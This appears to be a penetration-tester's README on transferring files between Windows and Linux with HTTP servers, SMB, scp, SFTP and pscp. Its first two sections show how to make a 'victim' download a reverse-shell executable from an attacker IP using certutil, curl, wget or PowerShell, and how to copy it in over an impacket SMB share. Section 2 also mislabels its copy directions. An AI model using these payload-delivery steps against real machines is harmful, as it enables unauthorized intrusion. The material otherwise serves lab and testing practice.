
# Ways to Transfer Files From Windows to Linux or Vice versa

* ### 1. Transfer file from attacker machine to victim after initial connection

* ### 2. Transfer file through SMBv1 Protocole.

* ### 3. To transfer a file from a Windows machine to a Linux machine using SMB (Server Message Block), you can use the `smbclient` command on the Linux machine.

* ### 4. Secure Copy (scp)

* ### 5. SFTP (Secure File Transfer Protocol)

* ### 6. PuTTY secure copy client (pscp)

----------------------------------------------------------------------

## 1. Transfer file from attacker machine to victim after initial connection

### Python Server

#### On Attacker Machine

`$python -m SimpleHTTPServer 9000` 

`or`

`python3 -m http.server 80`

#### On Victim Machine

`certutil -urlcache -f http://10.17.11.201/reverse_4444.exe shell.exe`

or

`curl -o shell.exe http://10.17.11.201/reverse_4444.exe`

or 

`wget http://10.17.11.201/reverse_4444.exe -O shell.exe`

or Using powershell

`Invoke-WebRequest -Uri http://10.17.11.201/reverse_4444.exe -OutFile shell.exe`

-----------------------------------------------------------------------

## 2. Transfer file through SMBv1 Protocole.

#### On Windows to start the SMBv1 service

`Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All` In PowerShell with administrator privileges.

#### On Kali to start the SMBv1 service

[python3-impacket](https://github.com/fortra/impacket) repo.

`sudo python3 /opt/impacket/examples/smbserver.py kali .`

* `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe` from windows to linux(Attacker_machine).

* `copy C:\PrivEsc\reverse.exe \\10.17.11.201\kali\reverse.exe` from linux to windows

---------------------------------------------------------------------

## 3. To transfer a file from a Windows machine to a Linux machine using SMB (Server Message Block), you can use the `smbclient` command on the Linux machine.

* Make sure that the Linux machine has the smbclient package installed.

`sudo apt-get install smbclient`

* Share a directory on the Windows machine that you want to transfer the file to. Make sure the directory is accessible by the user account you will use to connect to it via SMB.

You can create a shared directory on a Windows machine using the following steps:

1. Right-click on the folder that you want to share and select "Properties" from the context menu.

2. In the Properties window, click on the "Sharing" tab.

3. Click on the "Advanced Sharing" button.

4. Check the box next to "Share this folder" to enable sharing.

5. Enter a name for the share in the "Share name" field. This will be the name that you use to access the share from other machines on the network.

6. You can also set permissions for the share by clicking on the "Permissions" button. Here you can add or remove users and groups and set the level of access they have to the share.

7. Click "OK" to close the "Permissions" window.

8. Click "OK" again to close the "Advanced Sharing" window.

9. Finally, click "Close" to close the Properties window.

* On the Linux machine

`smbclient //WINDOWS_HOSTNAME/SHARE_NAME -U USERNAME%PASSWORD`

`smb: \> put /path/to/example.txt` : to transfer the file from the Linux machine to the Windows machine

`smb: \> get myfile.txt` : to download a file from the share

`smb: \> exit` : to close the connection

-----------------------------------------------------------------------

## 4. Secure Copy (scp)

SCP is a command-line tool, and is available on most Unix-based systems, as well as Windows systems with the installation of software such as PuTTY or WinSCP.

`scp /path/to/local/file.txt user@remotehost:/path/to/destination/`

-----------------------------------------------------------------------

## 5. SFTP (Secure File Transfer Protocol)

An SSH server must be running on the Linux machine before you start. You should also ensure you have installed an FTP app on Windows, like [FileZilla](https://filezilla-project.org/download.php), which has SFTP support.

`sudo apt list openssh-server` : to check ssh service is present

`sudo apt-get install openssh-server` : to install the ssh service

#### To regenerate the ssh key :

`mkdir /etc/ssh/default-keys`

`mv /etc/ssh/ssh_host_* /etc/ssh/default-keys/` : to save the default key

`dpkg-reconfigure openssh-server` : regenerating the keys

#### Now start the ssh service

`sudo systemctl start sshd` : to start the  ssh service

`sudo systemctl status sshd` : to check the status

`sudo systemctl enable sshd` : to enable parment start ssh service after reboot

### FileZilla :

To use this method, run FileZilla, then:

1. Open File > Site Manager
2. Create a New Site
3. Set the Protocol to SFTP
4. Add the target IP address in Host
5. Specify a username and password
6. Set the Logon Type to Normal
7. Click Connect when ready

## 1.png

![App Screenshot](https://github.com/rohit00712/Tools/blob/main/File_Transfer/images/1.PNG)

You can then use the FTP app to move files from Windows to Linux and back using drag and drop.

### Connect to SFTP server

`sftp user@<Machine_IP>`

`put /path/to/local/file /path/to/remote/file` : transfer local to remote

`get /path/to/remote/file /path/to/local/file` : remote to local machine

-------------------------------------------------------

## 6. [PuTTY secure copy client](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) (pscp)

- `pscp` is a command-line tool for transferring files securely between Windows and Linux computers using the SSH protocol. It is part of the `PuTTY` suite of tools, which also includes PuTTY, a SSH client for Windows.

- To use `pscp`, you will need to have a SSH server running on the Linux computer that you want to transfer files to or from. You will also need to have the `pscp` tool installed on your Windows computer.

#### To transfer a file from the Linux computer to the Windows computer:

`pscp username@<linux_IP>:/path/to/file.txt C:\path\to\destination\file.txt`

-------------------------------------------------------
